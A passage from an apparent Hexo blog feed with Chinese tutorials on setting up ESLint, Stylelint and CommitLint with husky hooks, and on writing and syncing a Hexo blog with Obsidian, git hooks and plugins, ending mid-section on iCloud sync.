class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">extends</span>: [<span class="string">&#x27;eslint:recommended&#x27;</span>, <span class="string">&#x27;plugin:@typescript-eslint/recommended&#x27;</span>],</span><br><span class="line">  <span class="attr">parser</span>: <span class="string">&#x27;@typescript-eslint/parser&#x27;</span>,</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&#x27;@typescript-eslint&#x27;</span>],</span><br><span class="line">  <span class="attr">root</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>更多信息可以参考<a href="https://typescript-eslint.io/docs/">官方指南</a></p><h2 id="1-5-与-Husky-集成"><a href="#1-5-与-Husky-集成" class="headerlink" title="1.5 与 Husky 集成"></a>1.5 与 Husky 集成</h2><p>使用 <code>lint-staged</code> + <code>husky</code> 的配置对每次代码进行提交检查是一个好习惯，你可以先看<a href="https://blog.esunr.site/2022/05/d36522b1089c.html">《使用 husky 每次提交时进行代码检查》</a>这篇文章来快速了解 husky 的使用。</p><p>安装完 <code>lint-staged</code> 和 <code>husky</code> 后，在 <code>package.json</code> 中添加：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;lint-staged&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line"><span class="attr">&quot;src/**/*.&#123;js,vue,ts&#125;&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint --cache --fix&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;src/**/*&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prettier --write&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在 <code>pre-commit</code> hook 中添加：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx lint-staged</span><br></pre></td></tr></table></figure><h1 id="2-Stylelint"><a href="#2-Stylelint" class="headerlink" title="2. Stylelint"></a>2. Stylelint</h1><p><a href="https://stylelint.io/">官网</a></p><p>Stylelint 与 ESLint 其实一样，都是对代码进行静态分析，在你编写代码的时候就检查代码中的错误并给出警报或者帮你自动修复。</p><h2 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h2><blockquote><p>如果你使用 VSCode，记得安装 Stylelint 插件</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev stylelint stylelint-config-standard</span><br></pre></td></tr></table></figure><h2 id="2-2-配置"><a href="#2-2-配置" class="headerlink" title="2.2 配置"></a>2.2 配置</h2><p>创建一个 <code>stylelint.config.js</code> 文件，并写入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">extends</span>: [</span><br><span class="line">        <span class="string">&#x27;stylelint-config-standard&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然你也可以添加其他的插件，比如你想用 StyleLint 来检查 stylus 样式，就可以使用 <a href="https://ota-meshi.github.io/stylelint-plugin-stylus/#introduction">stylelint-plugin-stylus</a> 插件。</p><h2 id="2-3-使用自定义规则"><a href="#2-3-使用自定义规则" class="headerlink" title="2.3 使用自定义规则"></a>2.3 使用自定义规则</h2><p>如果你想要自定义规则，则可以在 <code>rules</code> 字段中添加，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">extends</span>: [</span><br><span class="line">        <span class="string">&#x27;stylelint-config-standard&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">rules</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;stylus/property-no-unknown&#x27;</span>: [</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// https://stylelint.io/user-guide/rules/list/property-no-unknown/</span></span><br><span class="line">                <span class="attr">ignoreProperties</span>: [<span class="string">&#x27;fixed&#x27;</span>, <span class="string">&#x27;absolute&#x27;</span>, <span class="string">&#x27;relative&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;stylus/at-rule-no-unknown&#x27;</span>: [</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// https://stylelint.io/user-guide/rules/at-rule-no-unknown</span></span><br><span class="line">                <span class="attr">ignoreAtRules</span>: [<span class="string">&#x27;forward&#x27;</span>, <span class="string">&#x27;use&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;stylus/selector-type-no-unknown&#x27;</span>: [</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// https://stylelint.io/user-guide/rules/list/selector-type-no-unknown/</span></span><br><span class="line">                <span class="attr">ignoreTypes</span>: [<span class="string">&#x27;odd&#x27;</span>, <span class="string">&#x27;even&#x27;</span>, <span class="string">&#x27;2n&#x27;</span>, <span class="string">&#x27;2n+1&#x27;</span>, <span class="string">&#x27;/\-?\d?n\+\d/&#x27;</span>, <span class="string">&#x27;/^[1-9]/&#x27;</span>, <span class="string">&#x27;/(\-)?n/&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// &gt;&gt;&gt; 和 /deep/ 指令已被废弃、使用 v-deep(.cls) 代替</span></span><br><span class="line">        <span class="comment">// https://github.com/vuejs/rfcs/blob/master/active-rfcs/0023-scoped-styles-changes.md</span></span><br><span class="line">        <span class="string">&#x27;selector-pseudo-class-no-unknown&#x27;</span>: [</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">ignorePseudoClasses</span>: [<span class="string">&#x27;v-global&#x27;</span>, <span class="string">&#x27;v-deep&#x27;</span>, <span class="string">&#x27;v-slotted&#x27;</span>, <span class="string">&#x27;deep&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;selector-pseudo-element-no-unknown&#x27;</span>: [</span><br><span class="line">            <span class="literal">true</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">ignorePseudoElements</span>: [<span class="string">&#x27;v-deep&#x27;</span>, <span class="string">&#x27;v-global&#x27;</span>, <span class="string">&#x27;v-slotted&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 禁止分号</span></span><br><span class="line">        <span class="string">&#x27;stylus/semicolon&#x27;</span>: [</span><br><span class="line">            <span class="string">&#x27;never&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 禁止冒号</span></span><br><span class="line">        <span class="string">&#x27;stylus/declaration-colon&#x27;</span>: [<span class="string">&#x27;never&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;comment-empty-line-before&#x27;</span>: [<span class="string">&#x27;always&#x27;</span>, &#123;</span><br><span class="line">            <span class="comment">// http://stylelint.cn/user-guide/rules/comment-empty-line-before/</span></span><br><span class="line">            <span class="attr">except</span>: [<span class="string">&#x27;first-nested&#x27;</span>],</span><br><span class="line">        &#125;],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-与-husky-集成"><a href="#2-4-与-husky-集成" class="headerlink" title="2.4 与 husky 集成"></a>2.4 与 husky 集成</h2><p>stylelint 仍推荐与 <code>lint-staged</code> 和 <code>husky</code> 集成，在 <code>lint-staged</code> 规则里写入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;*.css&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stylelint&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;*.scss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stylelint --syntax=scss&quot;</span> <span class="comment">// 如果需要 scss 校验的话</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="3-CommitLint"><a href="#3-CommitLint" class="headerlink" title="3. CommitLint"></a>3. CommitLint</h1><p><a href="https://commitlint.js.org/#/?id=getting-started">官网</a></p><h2 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install @commitlint/cli @commitlint/config-conventional -D</span><br></pre></td></tr></table></figure><h2 id="3-2-配置"><a href="#3-2-配置" class="headerlink" title="3.2 配置"></a>3.2 配置</h2><p>创建一个 <code>commitlint.config.js</code> 文件来配置 commitlint 的规则，以下是官方推荐的一行配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;module.exports = &#123;extends: [&#x27;@commitlint/config-conventional&#x27;]&#125;&quot;</span> &gt; commitlint.config.js</span><br></pre></td></tr></table></figure><h2 id="3-3-生成标准化的-commit"><a href="#3-3-生成标准化的-commit" class="headerlink" title="3.3 生成标准化的 commit"></a>3.3 生成标准化的 commit</h2><p>可以使用 <a href="https://github.com/commitizen/cz-cli">commitzen</a> 来帮助生成标准化的 commit，从而通过 commitlint 的校验。</p><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install commitizen -D</span><br></pre></td></tr></table></figure><p>在 <code>package.json</code> 中添加 <code>scripts</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;commit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cz&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同时，在 <code>package.json</code> 中添加 <code>config</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;commitizen&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cz-conventional-changelog&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后每次提交代码时，将 <code>git commit -m &quot;xxx&quot;</code> 替换为 <code>npm run commit</code> 然后按照 cli 指令输入内容即可。</p><h2 id="3-3-与-husky-集成"><a href="#3-3-与-husky-集成" class="headerlink" title="3.3 与 husky 集成"></a>3.3 与 husky 集成</h2><p>创建 <code>commit-msg</code> hook 并添加内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">. <span class="string">&quot;\$(dirname &quot;</span>\<span class="variable">$0</span><span class="string">&quot;)/_/husky.sh&quot;</span></span><br><span class="line"></span><br><span class="line">npx --no -- commitlint --edit <span class="string">&quot;\$&#123;1&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>为 hook 添加执行权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x .husky/commit-msg</span><br></pre></td></tr></table></figure><p>如果使用 husky 4，则在 package.json 中添加：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;husky&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;hooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;commit-msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;commitlint -E HUSKY_GIT_PARAMS&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端工程化 </tag>
            
            <tag> lint </tag>
            
            <tag> eslint </tag>
            
            <tag> stylelint </tag>
            
            <tag> commitlint </tag>
            
            <tag> 代码检查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + Obsidian + Git 完美的博客部署与编辑方案</title>
      <link href="/2022/07/e9b42b453d9f.html"/>
      <url>/2022/07/e9b42b453d9f.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>在之前的文章<a href="https://blog.esunr.site/2022/06/64163235c30f.html">《Hexo 快速搭建指南》</a>中，重点讲解了如何搭建以及部署博客。但是在后期写博客的过程中，有可能遇到很多麻烦，比如：</p><ul><li>我不想手动维护文章的 Categorys，我想以文件目录的形式管理文章分类</li><li>VSCode 编写 Markdown 文件不爽，我想用其他的编辑器来写 Markdown</li><li><code>hexo new</code> 指令生成的模板太拉了，我不想用</li><li>我想把我的 markdown 文档同步到云平台上，方便我的其他设备即时查看</li></ul><p>那么这篇文章就会教你使用最舒服的姿势来后期维护你的博客，减少心智负担与解决各种不爽的地方。</p><h1 id="2-更好的文章管理方案"><a href="#2-更好的文章管理方案" class="headerlink" title="2. 更好的文章管理方案"></a>2. 更好的文章管理方案</h1><h2 id="2-1-文章以目录分类"><a href="#2-1-文章以目录分类" class="headerlink" title="2.1 文章以目录分类"></a>2.1 文章以目录分类</h2><p>当我们写好一篇文章后，按照 hexo 的默认配置，我们需要将其放在 <code>source/_post</code> 目录下，等时间长了之后，<code>_post</code> 目录下的文章就会变得杂乱无章，无法让我们快速的 review 到一篇文章。</p><p>那么最好的解决方案就是我们在创建文章的时候以 <code>文章分类</code> 作为文件夹创建我们的文章，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── source</span><br><span class="line">    └── _post</span><br><span class="line">        ├── 前端</span><br><span class="line">        │   ├── Javascript</span><br><span class="line">        │   │   └── Javascript原型链机制.md</span><br><span class="line">        │   └── 浏览器</span><br><span class="line">        │       └── 浏览器性能优化.md</span><br><span class="line">        └── 后台</span><br><span class="line">            ├── GoLang</span><br><span class="line">            │   └── go语言简介.md</span><br><span class="line">            └── Java</span><br><span class="line">                └── Spring MVC 快速入门.md</span><br></pre></td></tr></table></figure><h2 id="2-2-根据文件目录自动生成-categories-信息"><a href="#2-2-根据文件目录自动生成-categories-信息" class="headerlink" title="2.2 根据文件目录自动生成 categories 信息"></a>2.2 根据文件目录自动生成 categories 信息</h2><p>虽然我们把文章放的井井有条了，但是每个文章里的 <code>categorys</code> 字段还是要我们手动自己维护的，比如在 <code>source/_post/前端/Javascript/Javascript原型链机制.md</code> 文件中，我们要通过手写 <code>categories</code> 来让 hexo 知道这篇文章被放在 <code>前端-Javascript</code> 分类下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Javascript原型链机制</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">  -</span> 前端</span><br><span class="line"><span class="bullet">  -</span> Javascript</span><br><span class="line"><span class="section">date: 2022-06-05 12:06:47</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">这里是正文</span><br></pre></td></tr></table></figure><p>为了省去手动维护 <code>categorys</code> 字段的这个问题，我们可以使用 <a href="hexo-auto-category">hexo-auto-category</a> 这个插件。这个插件在 Hexo 进行 build 的时候会去自动根据文章目录情况来自动修改文章的 <code>categories</code> 信息，更详细的部分可以看<a href="https://blog.eson.org/pub/e2f6e239/">作者的文章</a>。</p><p>除此之外最好修改一下 <code>_config.yml</code> 中的两处默认配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 permalink 让你的文章链接更加友好，并且有益于 SEO</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:hash.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 规定你的新文章在 _post 目录下是以 cateory </span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:category/:title</span></span><br></pre></td></tr></table></figure><h2 id="2-3-提交代码时自动生成新文章的-categories"><a href="#2-3-提交代码时自动生成新文章的-categories" class="headerlink" title="2.3 提交代码时自动生成新文章的 categories"></a>2.3 提交代码时自动生成新文章的 categories</h2><p>但是这里有一个问题，就是只有 hexo 在执行 <code>hexo generate</code> 或者 <code>hexo server</code> 时候才会去触发 <code>categories</code> 的生成，那么每次我们创建文章都要经历这样的工作流：</p><ol><li>创建分类目录，写文章，文件名推荐与文章标题一致（不用关心 <code>categories</code> 写什么）；</li><li>填写 <code>title</code>、<code>date</code>、<code>tag</code> 等元信息（这个文章后续再讨论如何省去这一步）;</li><li>执行 <code>npx hexo generate</code> 在构建博客的时候触发 <code>hexo-auto-category</code> 插件的自动矫正 <code>categories</code> 功能；</li><li>检查文章中的 <code>categories</code> 是否正确；</li><li>添加 git 工作区变更，并提交并推送代码到 github。</li></ol><p>为了简化这些工作，我们可以使用 git hook，在我们每次执行 <code>commit</code> 前都自动运行 <code>npx hexo generate</code> 触发自动生成 <code>categories</code> 的行为，并将生成后的变更自动添加到本次提交中，然后一同 push 到 github 上去。这里可以使用 husky 来很方便的设置这样一个 git hook。</p><blockquote><p>GitHook 可以在执行代码的 commit、push、rebase 等阶段前触发，做一些前置行为，比如在每次提交代码时候执行一段 shell 脚本，来做一些代码检查或者通知 ci 等操作。</p><p>Husky 采用了更简单的一种方式，让管理 GitHook 更加现代化</p><p>关于 Husky 的使用可以参考我之前的文章<a href="https://blog.esunr.site/2022/05/d36522b1089c.html">《使用 husky 每次提交时进行代码检查》</a></p></blockquote><p>你可以按照如下步骤快速完成设置：</p><ol><li>安装 huksy：<code>npm install husky --save-dev</code></li><li>执行 huksy 初始化指令：<code>npx husky install</code></li><li>在 <code>package.json</code> 中的 <code>scripts</code> 中写入：<code>&quot;prepare&quot;: &quot;husky install&quot;</code></li><li>在生成的 <code>.husky</code> 目录创建 <code>pre-commit</code> 文件（有的话就不用创建），并写入以下内容：</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line">. <span class="string">&quot;<span class="subst">$(dirname -- <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>/_/husky.sh&quot;</span></span><br><span class="line"></span><br><span class="line">npx hexo generate &amp;&amp; git add .</span><br></pre></td></tr></table></figure><blockquote><p>如果手动创建记得为 pre-commit 文件添加执行权限 <code>chmod +x pre-commit</code></p></blockquote><p>如果提交代码的时候，终端出现类似的构建过程，就说明由 husky 创建的  git hook 生效了：</p><p><img src="https://s2.loli.net/2022/07/06/vcMfioCqpDtsFQd.png" alt=""></p><p>这样你新建一篇博客的工作流就简化为：</p><ol><li>创建分类目录，写文章；</li><li>填写 <code>title</code>、<code>date</code>、<code>tag</code> 等元信息;</li><li>添加 git 工作区变更，并提交并推送代码到 github。</li></ol><p>这样就解决了令人头疼的文章分类问题~</p><h1 id="3-使用-Obsidian-来编写和管理文章"><a href="#3-使用-Obsidian-来编写和管理文章" class="headerlink" title="3. 使用 Obsidian 来编写和管理文章"></a>3. 使用 Obsidian 来编写和管理文章</h1><blockquote><p>Obsidian 是目前个人感觉使用起来最舒服的基于 Markdown 的笔记管理工具，好处不多言，用了就知道。</p></blockquote><h2 id="3-1-将-Hexo-项目导入-Obsidian"><a href="#3-1-将-Hexo-项目导入-Obsidian" class="headerlink" title="3.1 将 Hexo 项目导入 Obsidian"></a>3.1 将 Hexo 项目导入 Obsidian</h2><p>这一步很简单，打开 Obsidian 后，它会默认打开上次的存储库，这个时候你需要点击左下角的 <code>打开其他库</code> icon 来调出欢迎面板：</p><p><img src="https://s2.loli.net/2022/07/06/QekZfSFhYlPwRim.png" alt=""></p><p>然后在欢迎面板打开你的 Hexo 项目即可：</p><p><img src="https://s2.loli.net/2022/07/06/YuTzAZeRvICmrEw.png" alt=""></p><p>由于 hexo 的文章只存在于 <code>source</code> 目录下，我们需要让 Obsidian 忽略其他文件的内容以优化性能以及减少不必要的搜索结果。具体的操作是在 <code>设置-文件与链接-Exclude Files</code>，将需要忽略的文件添加进去（尤其是 node_modules）：</p><p><img src="https://s2.loli.net/2022/07/06/8kN4a7H6XSAJzMo.png" alt=""></p><p>同时，在你的 hexo 项目的 .gitignore 文件中加入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.obsidian/workspace</span><br></pre></td></tr></table></figure><blockquote><p>.obsidian 文件本身是可以同步的，当前存储库的插件以及相关的配置都会下载在这个文件夹中，因此将其同步到 git 记录中也是非常有用的，假如你切换设备就不需要重新为当前的存储库重新配置 Obsidian 了。</p></blockquote><h2 id="3-2-使用-Obsidian-模板快速创建文章"><a href="#3-2-使用-Obsidian-模板快速创建文章" class="headerlink" title="3.2 使用 Obsidian 模板快速创建文章"></a>3.2 使用 Obsidian 模板快速创建文章</h2><p>Obsidian 是支持创建新文件时插入模板的，这就意味着我们可以不用重复写 Hexo 博客文的 <a href="https://hexo.io/zh-cn/docs/front-matter.html">Front-matter</a> 部分。</p><blockquote><p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p><p>-–<br>title: Hello World<br>date: 2013/7/13 20:46:25<br>-–</p></blockquote><p>首先我们要创建模板，我们可以在 <code>source</code> 目录下创建 <code>_obsidian</code> 文件夹，并创建一篇 <code>Post Template</code> 的文章（md文件），内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123;title&#125;&#125;</span><br><span class="line">date: &#123;&#123;date&#125;&#125;</span><br><span class="line">tags: []</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>然后进入到 Obsidian 的设置面板，选择『核心插件』，并启用『模板』功能。同时点击旁边的配置按钮，进入到模板配置的设置中，将配置信息设置为：</p><p><img src="https://s2.loli.net/2022/07/06/GcWpeZHJIumFEs1.png" alt=""></p><p>之后，我们再创建新文章的时候，只需要点击侧边栏的『插入模板』按钮就可以快速生成 Front-matter 信息：</p><p><img src="https://s2.loli.net/2022/07/06/aV4GeoxKZLMWg2j.png" alt=""></p><h2 id="3-3-使用-Obsidian-Git-插件"><a href="#3-3-使用-Obsidian-Git-插件" class="headerlink" title="3.3 使用 Obsidian Git 插件"></a>3.3 使用 Obsidian Git 插件</h2><p>我们将 Hexo 项目导入到 Obsidian 之后就可以写作了，但是当写作完成之后还面临着提交代码、推送代码到 Github 上这一操作。如果我们在用额外的终端来进行这些操作的话就太割裂了，因此我们可以使用 Obsidian Git 插件来在 Obsidian 内就可以实现 git commit 以及 push 的操作。</p><p>Obsidian Git 属于第三方插件，要想使用它必须在设置中关闭安全模式：</p><p><img src="https://s2.loli.net/2022/07/06/YmbFpJyDTazhCfd.png" alt=""></p><p>然后浏览插件库，搜索 Obsidian Git 并点击安装，安装完成之后根据自己需要的设置进行配置即可。</p><p>如果想要查看当前的工作区、暂存区，可以使用快捷键 <code>command + p</code> 打开命令面板，输入 <code>open source control view</code> 就可以打开 Git 面板了，这里的面板跟 VSCode 的面板操作类似，并且我它会自动帮你生成 commit 信息（你可以自行在 Obsidian Git 设置面板里配置默认的 commit 信息）：</p><p><img src="https://s2.loli.net/2022/07/06/jDtmglLPznXrsx8.png" alt=""></p><p>当然你也可以懒得看 source control view，自己直接用 <code>command+p</code> 打开命令面板，分别执行 <code>git commit</code> 命令与 <code>git push</code> 即可。</p><h2 id="3-4-使用-File-Tree-插件"><a href="#3-4-使用-File-Tree-插件" class="headerlink" title="3.4 使用 File Tree 插件"></a>3.4 使用 File Tree 插件</h2><p>Obsidian 很不好的一点就是会把所有的文件都列在左侧的文件列表中，但是对于我们的 Hexo 项目写文章来说，我们只会修改 <code>_post</code> 目录下的文件，因此我们希望左侧的文件列表中只显示 <code>_post</code> 文件夹，但是目前为止 Obsidian 并没有推出类似『聚焦』到某一文件夹内的功能。</p><p>好在 Obsidian 强大的插件库中有一个 <code>File Tree Alternative Plugin</code> 第三方插件可以满足这一需求。按照 Obsidian Git 相同的方法去下载这个第三方插件，下载完成之后我们会发现左侧菜单出现了一个 <code>File Tree</code> 的 Tab 页，点击后就可以看到文件以树形的结构呈现：</p><p><img src="https://s2.loli.net/2022/07/06/83QJC6ohSzFpqVK.png" alt=""></p><p>我们展开 <code>source</code> 文件夹，并右键 <code>_post</code> 文件夹，选择 <code>Focuse on Folder</code> 后，左侧的文件列表中就只会显示 <code>_post</code> 文件夹中的内容了：</p><p><img src="https://s2.loli.net/2022/07/06/61qjEJyv3pwmsWt.jpg" alt=""></p><h1 id="4-使用-iCloud-同步（不推荐，因为-Obsidian-文件嵌套很深，iCloud-同步会很灾难）"><a href="#4-使用-iCloud-同步（不推荐，因为-Obsidian-文件嵌套很深，iCloud-同步会很灾难）" class="headerlink" title="4. 使用 iCloud 同步（不推荐，因为 Obsidian 文件嵌套很深，iCloud 同步会很灾难）"></a>4. 使用 iCloud 同步（不推荐，因为 Obsidian 文件嵌套很深，iCloud 同步会很灾难）</h1><p>如果你是苹果系用户，完全可以通过 iCloud 将 Hexo 项目作为 Obsidian 库同步到各个设备上，让每个设备都可以通过 Obsidian 实时查看和编辑笔记。</p><p>你只需要将你的 Hexo 项目复制到 iCloud 的 Obsidian 文件夹即可，但是需要注意的一点是，你项目的 <code>node_modules</code> 也同步到 iCloud 上的话就太恐怖了。为了避免这一情况，我们需要将 <code>node_modules</code> 命名为 <code>node_modules.nosync</code> 这样就不会被 iCloud 同步。但是我们又需要 <code>node_modules</code> 来让项目正常运行，因此我们可以使用软链来创建一个 <code>node_modules</code> 软链到 <code>node_modules.nosync</code> 就能一举两得。简化成终端指令可以为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名 node_modules</span></span><br><span class="line"><span 